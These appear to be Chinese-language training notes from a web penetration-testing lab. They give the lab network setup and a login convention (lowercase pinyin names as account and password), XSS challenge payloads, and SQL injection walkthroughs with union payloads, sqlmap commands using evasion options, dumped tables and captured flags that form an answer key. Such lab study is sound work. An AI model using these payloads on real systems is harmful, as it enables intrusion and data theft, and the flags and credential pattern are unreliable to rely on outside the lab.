

# 多元情报体系系统平台地址

### ip范围

10.223.47.101~10.223.47.130

### ip配置

```bash
10.223.47.114
255.255.255.0
10.223.47.254

114.114.114.114.114
8.8.8.8
```



### 添加路由

删除网关

cmd管理员权限

终端管理员权限永久添加路由

```bash
route -p add 10.223.20.0 mask 255.255.255.0 10.223.47.254 metric 1
```

该路由指定发往**10.223.20.0/24**的流量（10.223.20.0–10.223.20.255 范围内的所有 IP）将通过网关**10.223.47.254**进行路由。

度量值`1`可确保该路由优先于同一目标网络中度量值较高的其他路由。

### 多元情报体系系统平台地址

http://10.223.20.31/

账号和密码是姓名小写全拼



# xss

## xss攻击

### 反射型XSS

#### 第一题

```bash
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "欢迎用户".$str."";
?>
```



```
?name=<script>alert('XSS')</script>
```

####  第二题 输入框闭合

```bash
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "没有找到和".htmlspecialchars($str)."相关的结果.".'...
```



```bash
?keyword="><script>alert('XSS')</script>
```

#### 第3题

```bash
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "没有找到和".htmlspecialchars($str)."相关的结果.".'...
```



### 存储型XSS

存储型：持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。

既然存储在页面我们就可以利用浏览器的工具修改页面元素属性，从而触发

#### 第一题 Referer

```bash
ini_set("display_errors", 0);
$str11=$_SERVER['HTTP_REFERER'];
$str22=str_replace(">","",$str11);
$str33=str_replace("<","",$str22);
....留言....
input name="t_ref"  value="'.$str33.'" type="hidden">
```



##### 查看网页源代码

```bash
<input name="t_ref"  value="http://10.223.20.120/" type="hidden">
```

> 尖括号过滤为空，隐藏属性，`t_ref`是Referer

将输入框显示出来，`type='text'`

```bash
" type='text' onclick=alert('XSS')>//
```

![image-20241127111617969](https://image.201068.xyz/assets/15.通用渗透测试项目实操(梭哈)/image-20241127111617969.png)

```bash
#鼠标移动
" type='text' onmouseover='alert(1)'>//	
#鼠标点击
" type='text' onclick='javascript:alert(1)'>//
```

#### 第二题 User-Agent

```bash
$str11 = $_SERVER['HTTP_USER_AGENT'];
        $str22 = str_replace(">", "", $str11);
        $str33 = str_replace("<", "", $str22);
        .....其他.....
        input name="t_ua"  value="<?=$str33;?>" type="hidden">

```

##### 查看网页源代码

```bash
<input name="t_ua"  value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" type="hidden">
```

> t_ua是User-Agent

发现页面中含有User-Agent内容

```bash
" type='text' onclick='javascript:alert(1)'>\\
```

#### 第三题 Cookie

```bash
function srandom($length) {
    $hash = '';
    $chars = '0123456789';
    $max = strlen($chars) - 1;
    mt_srand((double) microtime() * 1000000);
    for ($i = 0; $i < $length; $i++) {
        $hash .= $chars[mt_rand(0, $max)];
    }
    return $hash;
}
$str11=strtolower($_COOKIE["user"]);
if(!$str11){
setcookie("user", "LuanYu-" . srandom(4), time() + 3600);
$str11= strtolower($_COOKIE["user"]);
}

$str22 = str_replace(">", "", $str11);
$str33 = str_replace("<", "", $str22);

.....省略......
if (strpos($str33, 'alert') !== false) {
.....
}
.....
input name="t_cook"  value="<?=$str33;?>" type="hidden">

```

##### 网页源代码

```bash
<input name="t_cook"  value="" type="hidden">
```

`t_cook`是Cookie

```bash
" type='text' onclick=alert('XSS')>//
```

![image-20241127113619006](https://image.201068.xyz/assets/15.通用渗透测试项目实操(梭哈)/image-20241127113619006.png)

#### 第四题

```bash
<center><iframe name="leftframe" width=0 height=0 src="./a.php" frameborder=no scrolling="no"></iframe></center>
```



```bash
$str = $_GET["key"];
echo "<h2 align=center>".$str."机密是：".$str11."</h2>";
```



```bash
b.php?key=<script>alert('XSS')</script>
```

![image-20241127125051086](https://image.201068.xyz/assets/15.通用渗透测试项目实操(梭哈)/image-20241127125051086.png)

#### 第五题 ng-include

ng-include是 angular js中的东西，其作用相当于php的include函数

##### ng-include的用法

1. 1、ng-include 指令用于包含外部的 HTML文件。
2. 2、包含的内容将作为指定元素的子节点。
3. 3、ng-include 属性的值可以是一个表达式，返回一个文件名。
4. 4、默认情况下，包含的文件需要包含在同一个域名下。

> 值得注意的是：
>
> - ng-include，如果单纯指定地址，必须要加引号
> - ng-include，加载外部html，script标签中的内容不执行
> - ng-include，加载外部html中含有style标签样式可以识别

```bash
#index.php 部分源码：

$str = $_GET["src"];
.....省略......
echo '<span class="ng-include:'.htmlspecialchars($str).'"></span>';

#a.php 部分源码：

ini_set("display_errors", 0);
$str4 = $_GET["name"];
echo "<h2 align=center>用户".$str4."</h2>";
```



```bash
<span class="ng-include:"></span></div>
```

构造好payload:

```bash
index.php?src='a.php?name=<a href="javascript:alert(9)">'
```

### Dom型XSS

#### 第一题

```bash
ini_set("display_errors", 0);
$gc=htmlspecialchars($_GET["arg"]);
```



```bash
<embed id=em src=yp.mp3?gc= loop="15"  autostart="true"/>
```

没有引号，无需闭合

```bash
/index.php?arg=123 onmouseover='alert(1)'
```

#### 第二题

```bash
ini_set("display_errors", 0);
$gc=htmlspecialchars($_GET["arg"]);
```



```bash
<embed id=em src='1537.mp4?gc=' loop="15"  width="800" height="600" autostart="true"/>
<embed id=em src='1537.mp4?gc=<?=$gc?>' loop="15"  width="800" height="600" autostart="true"/>

```

单引号闭合

```bash
?arg=1' onmouseover='alert(1)' '
```

# SQL注入

## 配置路由

```bash
route -p add 10.223.21.0 mask 255.255.255.0 10.223.47.254 metric 1
```



## SQL基础

### 第一题

> 请查询userbase表中的name和depart字段。 

```bash
select name,depart from userbase
```

> D04C95626A8F29FC80ACB87350EADA29_4A827073665C230E

#### burp抓包

```bash
POST /study001/ HTTP/1.1
Host: 10.223.21.4:30517
Content-Length: 36
Pragma: no-cache
Cache-Control: no-cache
Origin: http://10.223.21.4:30517
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.223.21.4:30517/study001/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

s=select+name%2Cdepart+from+userbase
```

#### sqlmap

```bash
#当前数据库，用户，当前用户DBA权限，枚举库名，枚举表名，枚举列名，枚举字段
python sqlmap.py -r url.txt --level 1 --risk 1 --current-db --current-user --is-dba --dbs --tables --columns --dump --batch --dbms= MySQL

#脱库sqlstudy，去特征，打开所有优化，默认应答，清除缓存
python sqlmap.py -r url.txt --level 1 --risk 1 --dump-all --batch --purge -D sqlstudy -o --random-agent --tamper=between --flush-session --randomize=1 --dbms= MySQL
```

#### 字段字典

E:\learn\Penetration-tools\统领\storage\sqlmap-gui\data\txt\common-columns.txt

```bash
id
name
city
class
number
pro
flagstr
billdate
senddate
city
pro
number
furniture_type
furniture
depart
sex
workstatus
date
ctype
num
company
address
```

#### sqlstudy数据库表内容

```bash
Database: sqlstudy
Table: products_detail2
[5 entries]
+----+---------------------------+
| id | name                      |
+----+---------------------------+
| 1  | 佳能 个人复印机, 每套两件 |
| 2  | SAFCO 椅垫, 每套两件      |
| 3  | Rogers 文件夹, 蓝色       |
| 4  | 施乐 令, 优质             |
| 5  | 华为手机                  |
+----+---------------------------+

Table: userdepart
[10 entries]
+----+------------+---------------------------------------------------+----------------------+
| id | name       | address                                           | company              |
+----+------------+---------------------------------------------------+----------------------+
| 1  | 党群部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 2  | 追求部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 3  | 营业部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 4  | 共好部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 5  | 总宣部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 6  | 出口部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 7  | 采购部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 8  | 商务发展部 | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 9  | 研发部     | 河北省唐山市                                      | 銮舆科技股份有限公司 |
| 20 | 品牌部     | D04C95626A8F29FC80ACB87350EADA29_DFE80E814B78F7C0 | Ly_flag              |
+----+------------+---------------------------------------------------+----------------------+

Table: products_bill
[40 entries]
+----+------+----------------------------------+--------+----------------------+------------+------------+
| id | pro  | city                             | name   | number               | billdate   | senddate   |
+----+------+----------------------------------+--------+----------------------+------------+------------+
| 1  | 湖南 | 常德                             | 邢宁   | 家具-桌子-10000441   | 2016-01-01 | 2016-01-03 |
| 2  | 湖南 | 常德                             | 邢宁   | 技术-电话-10004819   | 2016-01-01 | 2016-01-03 |
| 3  | 湖南 | 常德                             | 邢宁   | 技术-配件-10000300   | 2016-01-01 | 2016-01-03 |
| 4  | 湖南 | 常德                             | 邢宁   | 办公用-收纳-10002430 | 2016-01-01 | 2016-01-03 |
| 5  | 福建 | 江口                             | 俞毅   | 家具-椅子-10003377   | 2016-01-01 | 2016-01-07 |
| 6  | 福建 | 江口                             | 俞毅   | 技术-配件-10003567   | 2016-01-01 | 2016-01-07 |
| 7  | 福建 | 江口                             | 俞毅   | 技术-复印-10004787   | 2016-01-01 | 2016-01-07 |
| 8  | 福建 | 江口                             | 俞毅   | 技术-电话-10003187   | 2016-01-01 | 2016-01-07 |
| 9  | 福建 | 江口                             | 俞毅   | 办公用-收纳-10000198 | 2016-01-01 | 2016-01-07 |
| 10 | 上海 | 上海                             | 麦虢   | 办公用-器具-10003859 | 2016-01-01 | 2016-01-09 |
| 11 | 上海 | 上海                             | 麦虢   | 技术-配件-10002318   | 2016-01-01 | 2016-01-09 |
| 12 | 辽宁 | 桓仁                             | 牛惠   | 家具-椅子-10002303   | 2016-01-01 | 2016-01-09 |
| 13 | 辽宁 | 桓仁                             | 牛惠   | 办公用-器具-10003582 | 2016-01-01 | 2016-01-09 |
| 14 | 辽宁 | 桓仁                             | 牛惠   | 办公用-器具-10001453 | 2016-01-01 | 2016-01-09 |
| 15 | 辽宁 | 桓仁                             | 牛惠   | 技术-电话-10002696   | 2016-01-01 | 2016-01-09 |
| 16 | 辽宁 | 桓仁                             | 牛惠   | 技术-复印-10003121   | 2016-01-01 | 2016-01-09 |
| 17 | 辽宁 | 桓仁                             | 牛惠   | 办公用-装订-10002049 | 2016-01-01 | 2016-01-09 |
| 18 | 广东 | 深圳                             | 陶丽雪 | 办公用-标签-10001875 | 2016-01-01 | 2016-01-08 |
| 19 | 广东 | 深圳                             | 陶丽雪 | 家具-桌子-10004891   | 2016-01-01 | 2016-01-08 |
| 20 | 江苏 | 金沙                             | 徐虹   | 办公用-纸张-10003357 | 2016-01-01 | 2016-01-09 |
| 21 | 江苏 | 金沙                             | 徐虹   | 家具-椅子-10002415   | 2016-01-01 | 2016-01-09 |
| 23 | 广东 | 珠海                             | 卢芳   | 办公用-系固-10000678 | 2016-01-05 | 2016-01-03 |
| 25 | 河北 | 保定                             | 廖乐   | 办公用-收纳-10004334 | 2016-01-05 | 2016-01-03 |
| 26 | 河北 | 保定                             | 廖乐   | 家具-书架-10002499   | 2016-01-05 | 2016-01-03 |
| 27 | 江苏 | 常州                             | 贺鹏   | 技术-配件-10001666   | 2016-01-05 | 2016-01-03 |
| 28 | 安徽 | 界首                             | 韩虎   | 办公用-装订-10001290 | 2016-01-05 | 2016-01-03 |
| 29 | 广东 | 湛江                             | 柯婷   | 办公用-标签-10004405 | 2016-01-06 | 2016-01-03 |
| 30 | 广东 | 湛江                             | 柯婷   | 技术-配件-10001666   | 2016-01-06 | 2016-01-03 |
| 31 | 辽宁 | 营口                             | 白立荣 | 家具-椅子-10001258   | 2016-01-07 | 2016-01-03 |
| 32 | 辽宁 | 营口                             | 白立荣 | 办公用-标签-10002697 | 2016-01-07 | 2016-01-03 |
| 33 | 辽宁 | 营口                             | 白立荣 | 技术-电话-10003796   | 2016-01-07 | 2016-01-03 |
| 34 | 辽宁 | 营口                             | 白立荣 | 办公用-美术-10000636 | 2016-01-07 | 2016-01-03 |
| 35 | 辽宁 | 营口                             | 白立荣 | 办公用-器具-10003836 | 2016-01-07 | 2016-01-03 |
| 36 | 湖北 | 武汉                             | 洪毅   | 办公用-系固-10000749 | 2016-01-08 | 2016-01-03 |
| 37 | 湖北 | 武汉                             | 洪毅   | 办公用-用品-10003194 | 2016-01-08 | 2016-01-03 |
| 38 | 湖北 | 武汉                             | 洪毅   | 家具-书架-10001133   | 2016-01-08 | 2016-01-03 |
| 39 | 湖北 | 武汉                             | 洪毅   | 技术-电话-10003151   | 2016-01-08 | 2016-01-03 |
| 40 | 湖北 | b63988f145ea74a1adbe7d8bbf9bb372 | flag   | 办公用-纸张-10004623 | 2016-01-01 | 2016-01-03 |
+----+------+----------------------------------+--------+----------------------+------------+------------+

Table: bill_details
[9 entries]
+----+--------+----------------+--------+
| id | city   | class          | name   |
+----+--------+----------------+--------+
| 1  | 牡丹江 | 办公用品       | 唐栋   |
| 2  | 牡丹江 | 办公用品       | 方蔓楚 |
| 3  | 高邮   | 办公用品       | 付涛   |
| 4  | 天津   | 办公用品       | 贺虹   |
| 5  | 七台河 | 办公用品       | 潘雯   |
| 6  | 沂水   | 办公用品       | 潘丽美 |
| 7  | 松陵   | 办公用品       | 佘平   |
| 8  | 汉沽   | 技术           | 丁崆   |
| 9  | fl     | 538278e985350c | 田立   |
+----+--------+----------------+--------+

Table: bill_details_class
[31 entries]
+----+--------------------+--------+----------------------+
| id | pro                | name   | number               |
+----+--------------------+--------+----------------------+
| 1  | 家具               | 秦君   | 家具-桌子-10000441   |
| 2  | 技术               | 曹欢悦 | 技术-电话-10004819   |
| 3  | 技术               | 范刚   | 技术-配件-10000300   |
| 4  | 办公用品           | 涂博   | 办公用-收纳-10002430 |
| 5  | 家具               | 贾松   | 家具-椅子-10003377   |
| 6  | 技术               | 肖冬露 | 技术-配件-10003567   |
| 7  | 技术               | 谭君   | 技术-复印-10004787   |
| 8  | 技术               | 马雯   | 技术-电话-10003187   |
| 9  | 办公用品           | 谭临耀 | 办公用-收纳-10000198 |
| 10 | 办公用品           | 徐岱   | 办公用-器具-10003859 |
| 11 | 技术               | 潘健   | 技术-配件-10002318   |
| 12 | 家具               | 夏惠英 | 家具-椅子-10002303   |
| 14 | 办公用品           | 唐安   | 办公用-器具-10001453 |
| 16 | 技术               | 韦实   | 技术-复印-10003121   |
| 17 | 办公用品           | 段强   | 办公用-装订-10002049 |
| 18 | 办公用品           | 韦华   | 办公用-标签-10001875 |
| 19 | 家具               | 林康   | 家具-桌子-10004891   |
| 20 | 办公用品           | 范晒明 | 办公用-纸张-10003357 |
| 21 | 家具               | 王辉   | 家具-椅子-10002415   |
| 22 | 家具               | 唐爽   | 家具-椅子-10001437   |
| 23 | 办公用品           | 薛君   | 办公用-系固-10000678 |
| 24 | 办公用品           | 韩莞颖 | 办公用-收纳-10004714 |
| 25 | 办公用品           | 殷昌   | 办公用-收纳-10004334 |
| 26 | 家具               | 袁丽华 | 家具-书架-10002499   |
| 27 | 技术               | 贺丹   | 技术-配件-10001666   |
| 28 | 办公用品           | 彭彩   | 办公用-装订-10001290 |
| 29 | 办公用品           | 黄丽   | 办公用-标签-10004405 |
| 30 | 919ef23a73f7f92946 | 田立   | ag                   |
| 31 | 家具               | 施立伟 | 家具-椅子-10001258   |
+----+--------------------+--------+----------------------+

Table: flag
[1 entry]
+----+---------------------------------------------------+
| id | flagstr                                           |
+----+---------------------------------------------------+
| 1  | D04C95626A8F29FC80ACB87350EADA29_BA94579D437A2EE6 |
+----+---------------------------------------------------+

Table: usercosts
[20 entries]
+----+-----+----------+--------+----------------------------------+
| id | num | ctype    | date   | name                             |
+----+-----+----------+--------+----------------------------------+
| 1  | 397 | 住宿费   | 44616  | 曾惠                             |
| 3  | 728 | 过路费   | 44617  | 宋良                             |
| 5  | 178 | 施工耗材 | 44618  | 俞明                             |
| 6  | 656 | 收款     | 44618  | 谢雯                             |
| 7  | 633 | 邮费     | 44619  | 康青                             |
| 8  | 39  | 收款     | 44619  | 赵婵                             |
| 9  | 509 | 快递     | 44620  | 刘斯                             |
| 10 | 570 | 收款     | 44620  | 白鹄                             |
| 11 | 275 | 餐饮     | 44621  | 贾彩                             |
| 12 | 719 | 收款     | 44621  | 马丽                             |
| 13 | 441 | 打车费   | 44621  | 宋栋                             |
| 14 | 180 | 收款     | 44621  | 巩虢                             |
| 15 | 662 | 办公外聘 | 44622  | 常松                             |
| 16 | 549 | 收款     | 44622  | 田黎                             |
| 17 | 678 | 油费     | 44623  | 谭乐                             |
| 18 | 773 | 收款     | 44623  | 徐岱                             |
| 19 | 645 | 快递     | 44624  | 武杰                             |
| 20 | 109 | flag     | 44624  | 923f146c4f18dce32ac33c1d2e34d22d |
+----+-----+----------+--------+----------------------------------+

Table: userbase
[99 entries]
+----+-----+---------+---------------------------------------------------+------------+
| id | sex | name    | depart                                            | workstatus |
+----+-----+---------+---------------------------------------------------+------------+
| 1  | 0   | Ly_Flag | D04C95626A8F29FC80ACB87350EADA29_4A827073665C230E | 在岗       |
| 2  | 0   | 养淑慧  | 生产部                                            | 在岗       |
| 3  | 0   | 曹楚楚  | 技术部                                            | 在岗       |
| 4  | 0   | 菱云亭  | 安全部                                            | 在岗       |
| 5  | 0   | 羿一璇  | 安全部                                            | 在岗       |
| 6  | 0   | 冯冰彤  | 安全部                                            | 在岗       |
| 7  | 0   | 印水儿  | 技术部                                            | 在岗       |
| 8  | 0   | 家小溪  | 安全部                                            | 在岗       |
| 9  | 0   | 空韫玉  | 生产部                                            | 在岗       |
| 10 | 0   | 广沛雯  | 宣传部                                            | 在岗       |
| 11 | 0   | 糜嘉洁  | 生产部                                            | 在岗       |
| 12 | 0   | 周凌寒  | 安全部                                            | 在岗       |
| 13 | 0   | 简天春  | 后勤部                                            | 在岗       |
| 14 | 0   | 桂语柳  | 后勤部                                            | 在岗       |
| 15 | 0   | 容诗珊  | 生产部                                            | 在岗       |
| 16 | 0   | 韶晏然  | 安全部                                            | 在岗       |
| 17 | 0   | 黎闵雨  | 安全部                                            | 在岗       |
| 18 | 0   | 步巧荷  | 技术部                                            | 在岗       |
| 19 | 0   | 晏春芳  | 生产部                                            | 在岗       |
| 20 | 0   | 家晨风  | 生产部                                            | 在岗       |
| 21 | 0   | 沃语薇  | 安全部                                            | 在岗       |
| 22 | 0   | 牛依白  | 安全部                                            | 在岗       |
| 23 | 0   | 訾怀玉  | 后勤部                                            | 在岗       |
| 24 | 0   | 丁碧彤  | 安全部                                            | 在岗       |
| 25 | 0   | 寇暄莹  | 后勤部                                            | 在岗       |
| 26 | 0   | 宫小莉  | 生产部                                            | 在岗       |
| 27 | 0   | 苏书文  | 后勤部                                            | 在岗       |
| 28 | 0   | 隗姣妍  | 技术部                                            | 在岗       |
| 29 | 0   | 逢智菱  | 生产部                                            | 在岗       |
| 30 | 0   | 戈思茵  | 安全部                                            | 在岗       |
| 31 | 0   | 郁西华  | 技术部                                            | 在岗       |
| 32 | 0   | 蓟诗筠  | 宣传部                                            | 在岗       |
| 33 | 0   | 韶梓婧  | 生产部                                            | 在岗       |
| 34 | 0   | 薛凉夏  | 安全部                                            | 在岗       |
| 35 | 0   | 张问儿  | 宣传部                                            | 在岗       |
| 36 | 0   | 林莉娜  | 宣传部                                            | 在岗       |
| 37 | 0   | 糜霞绮  | 后勤部                                            | 在岗       |
| 38 | 0   | 刘凝阳  | 宣传部                                            | 在岗       |
| 39 | 0   | 黎思敏  | 生产部                                            | 在岗       |
| 40 | 0   | 魏嘉悦  | 安全部                                            | 在岗       |
| 41 | 0   | 满姣妍  | 安全部                                            | 在岗       |
| 42 | 0   | 郭映安  | 技术部                                            | 在岗       |
| 43 | 0   | 习涵双  | 安全部                                            | 在岗       |
| 44 | 0   | 汤夏青  | 安全部                                            | 在岗       |
| 45 | 0   | 巢三姗  | 技术部                                            | 在岗       |
| 46 | 0   | 弓格格  | 安全部                                            | 在岗       |
| 47 | 0   | 沈天荷  | 后勤部                                            | 在岗       |
| 48 | 0   | 钭茹云  | 后勤部                                            | 在岗       |
| 49 | 0   | 鄂怡然  | 后勤部                                            | 在岗       |
| 50 | 0   | 贡涵涵  | 生产部                                            | 在岗       |
| 51 | 0   | 高筠竹  | 生产部                                            | 在岗       |
| 52 | 0   | 方子亦  | 宣传部                                            | 在岗       |
| 53 | 0   | 汤婧雯  | 技术部                                            | 在岗       |
| 54 | 0   | 惠睿思  | 宣传部                                            | 在岗       |
| 55 | 0   | 方芳菲  | 宣传部                                            | 在岗       |
| 56 | 0   | 古凝荷  | 生产部                                            | 在岗       |
| 57 | 0   | 袁优扬  | 安全部                                            | 在岗       |
| 58 | 0   | 隗梓彤  | 后勤部                                            | 在岗       |
| 59 | 0   | 汤幼珊  | 宣传部                                            | 在岗       |
| 60 | 0   | 李曲文  | 后勤部                                            | 在岗       |
| 61 | 0   | 关朗然  | 生产部                                            | 在岗       |
| 62 | 0   | 董七瑾  | 安全部                                            | 在岗       |
| 63 | 0   | 广亚玲  | 安全部                                            | 在岗       |
| 64 | 0   | 国春嫣  | 技术部                                            | 在岗       |
| 65 | 0   | 索叶吉  | 技术部                                            | 在岗       |
| 66 | 0   | 钱子芸  | 后勤部                                            | 在岗       |
| 67 | 0   | 张山雁  | 安全部                                            | 在岗       |
| 68 | 0   | 夏贤淑  | 生产部                                            | 在岗       |
| 69 | 0   | 通晓瑶  | 生产部                                            | 在岗       |
| 70 | 0   | 怀佩玉  | 后勤部                                            | 在岗       |
| 71 | 0   | 菱卿蓉  | 技术部                                            | 在岗       |
| 72 | 0   | 向芙蓉  | 宣传部                                            | 在岗       |
| 73 | 0   | 师春绿  | 安全部                                            | 在岗       |
| 74 | 0   | 漕荷珠  | 安全部                                            | 在岗       |
| 75 | 0   | 胡婉怡  | 生产部                                            | 在岗       |
| 76 | 0   | 鄂寄春  | 安全部                                            | 在岗       |
| 77 | 0   | 隗颜英  | 生产部                                            | 在岗       |
| 78 | 0   | 孟向莉  | 生产部                                            | 在岗       |
| 79 | 0   | 顾隽巧  | 生产部                                            | 在岗       |
| 80 | 0   | 鱼畅畅  | 技术部                                            | 在岗       |
| 82 | 0   | 茹乐容  | 技术部                                            | 在岗       |
| 84 | 0   | 任雅素  | 安全部                                            | 在岗       |
| 85 | 0   | 饶忻畅  | 后勤部                                            | 在岗       |
| 86 | 0   | 终秋彤  | 宣传部                                            | 在岗       |
| 87 | 0   | 家燕艳  | 技术部                                            | 在岗       |
| 88 | 0   | 龚芷巧  | 技术部                                            | 在岗       |
| 89 | 0   | 桂云韶  | 宣传部                                            | 在岗       |
| 90 | 0   | 从凝安  | 安全部                                            | 在岗       |
| 91 | 0   | 金雅美  | 生产部                                            | 在岗       |
| 92 | 0   | 牧忆彤  | 宣传部                                            | 在岗       |
| 93 | 0   | 乔梦兰  | 后勤部                                            | 在岗       |
| 94 | 0   | 胡云亭  | 后勤部                                            | 在岗       |
| 95 | 0   | 池玲娇  | 后勤部                                            | 在岗       |
| 96 | 0   | 赵谷蓝  | 生产部                                            | 在岗       |
| 97 | 0   | 戌千凡  | 后勤部                                            | 在岗       |
| 98 | 0   | 徐思云  | 生产部                                            | 在岗       |
| 99 | 0   | 乌秀如  | 宣传部                                            | 在岗       |
+----+-----+---------+---------------------------------------------------+------------+

Table: products_detail
[5 entries]
+----+----------------------+-----------+----------------+
| id | name                 | furniture | furniture_type |
+----+----------------------+-----------+----------------+
| 1  | Rogers 文件车, 金属  | 收纳具    | 办公用品       |
| 2  | Novimex 扶手椅, 红色 | 椅子      | 家具           |
| 3  | Bevis 圆桌, 黑色     | 桌子      | 家具           |
| 4  | A4纸                 | 纸张      | 办公用品       |
| 5  | Hoover 搅拌机, 红色  | 器具      | 办公用品       |
+----+----------------------+-----------+----------------+
```



### 第二题

> 现已知表userdepart想要查询其中的所有字段，要怎么做呢?

```bash
select * from userdepart
```

### 第三题

#### 数据库名

```bash
select database()
select group_concat(schema_name) from information_schema.schemata
```

> information_schema,mysql,performance_schema,sqlstudy

#### 表名

```bash
show tables
SELECT group_concat(TABLE_NAME) from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='sqlstudy'
select group_concat(table_name) from information_schema.tables where table_schema=database()
```

> bill_details,bill_details_class,flag,products_bill,products_detail,products_detail2,userbase,usercosts,userdepart

#### 字段名

```bash
select group_concat(COLUMN_NAME) from information_schema.COLUMNS where table_name = 'flag' and table_schema = 'sqlstudy'
```

> id,flagstr

#### 字段内容

```bash
select * from flag
```

> D04C95626A8F29FC80ACB87350EADA29_BA94579D437A2EE6

### 第四题

> 某公司费用表以usercosts命名，想要查询其中费用小于200元的所有花销要怎么做呢？已知花销全部在num字段中记录。

```bash
select * from usercosts where num<200
```

### 第五题

> 请查询订单日期为“2016-01-01”，在“2016-01-03”发货的所有订单。表名‘products_bill’

```bash
select * from products_bill
select * from products_bill where billdate="2016-01-01" and senddate="2016-01-03"
```

### 第六题

> 现有两张表，表1”bill_details“表2”bill_details_class“我们如果想把表1作为主表，通过人的名字来拼接两个表要怎么做呢？

```bash
select * from bill_details,bill_details_class

select * from bill_details join bill_details_class on bill_details.name=bill_details_class.name
```



### 第七题

> 现有表1”products_detail“表2”products_detail2“我们要把两张表汇总成1张要怎么做呢？

```bash
select * from products_detail left join products_detail2 on products_detail.name =products_detail2.name 
union select * from products_detail right join products_detail2 on products_detail.name = products_detail2.name
```



### 第八题

> 每次查询只显示10条数据，而我想看第25条数据，要怎么做呢？表名products_bill

#### 使用limit进行查询

方式一：更改每页检索的数量

```bash
select * from products_bill limit 30
```

方式二：更改开始检索的行数

```bash
select * from products_bill limit 20,10
```

### 第九题

> 表中有多少条小王参与打扫卫生的记录？表名 work_month_detail

```bash
select * from work_month_detail
select count(*) from work_month_detail where people="小王"
```

### 第十题

> 帮助财务统计本年度的净利润吧。 表名 price_detail 表示净利润的字段是 price_pur

```bash
select * from price_detail

select sum(price_pur) from price_detail
```

## 有错误回显

### 第一题 字符型

#### 源码

```bash
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```



```bash
http://10.223.21.4:30843/?id=1
?id=1' order by 4--
?id=-1' union select 1,2,3,4--+
?id=-1' union select 1,2,3,group_concat(schema_name) from information_schema.schemata--+
?id=-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()--+
?id=-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database()--+
?id=-1' union select 1,2,3,flag from flag --+
```

> 3，4
>
> information_schema,ly_netlab,mysql,performance_schema
>
> come_on_u_are_close,flag,users
>
> fake_flag,id,flag,id,name,fetters1,fetters2

#### sqlmap

```bash
python sqlmap.py -u http://10.223.21.4:30843/?id=1 --level 1 --risk 1 --current-db --batch --purge -o --random-agent --tamper=between --flush-session --randomize=1

python sqlmap.py -u http://10.223.21.4:30843/?id=1? --level 1 --risk 1 --dump-all --batch --purge -D ly_netlab -o --random-agent --tamper=between --flush-session --randomize=1
```

> ly_netlab

```bash
参数: id (GET)
    类型: 基于布尔盲注
    标题: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1?' AND 5005=5005 AND 'nGcg'='nGcg

    类型: 基于错误的注入
    标题: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: id=1?' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b627871,(SELECT (ELT(5775=5775,1))),0x716a627871,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'nnaj'='nnaj

    类型: 基于时间的盲注
    标题: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1?' AND (SELECT 6588 FROM (SELECT(SLEEP(5)))JIJQ) AND 'qiaV'='qiaV

    类型: UNION查询
    标题: Generic UNION query (NULL) - 4 columns
    Payload: id=-7125' UNION ALL SELECT NULL,NULL,CONCAT(0x716b627871,0x687671787367524a5a6f504278526854674e4649646f4670537069427a617978536c546a43795a6c,0x716a627871),NULL-- -
    
Database: ly_netlab
Table: come_on_u_are_close
[1 entry]
+----------------------+
| fake_flag            |
+----------------------+
| e2fc7ad1c912c04b0247 |
+----------------------+

Table: flag
[1 entry]
+----+
| id |
+----+
| 1  |
+----+

Table: users
[5 entries]
+----+
| id |
+----+
| 1  |
| 2  |
| 3  |
| 4  |
| 5  |
+----+
```





### 第二题 数字型

```bash
SELECT * FROM users WHERE id=$id LIMIT 0,1
```



```bash
?id=1 and 1=2
?id=1 order by 4--
?id=-1 union select 1,2,3,4--+
?id=-1 union select 1,2,3,group_concat(schema_name) from information_schema.schemata--+
?id=-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()--+
?id=-1 union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database()--+
?id=-1 union select 1,2,3,flag from flag --+
```



### 第三题 联合注入

```bash
SELECT * FROM users WHERE id='$id'
```

> 请使用 union select 或 order by 关键字哦！

联合注入的前提条件是用户可控参数所在Sql语句为查询语句，且以页面存在回显，

```bash
select * from users where id=”$id”
```

此时可以通过更改参数id来实现对数据库的操作。

考虑到前提是查询双方具有相同的列，可以使用order by 语句大致判断列数，也可以使用select 1，2，3，4等依次查看。

```bash
?id=1'
?id=1' order by 5--+
?id=-1' union select 1,2,3,4,5--+
?id=-1' union select 1,2,3,group_concat(schema_name),5 from information_schema.schemata--+
?id=-1' union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema=database()--+
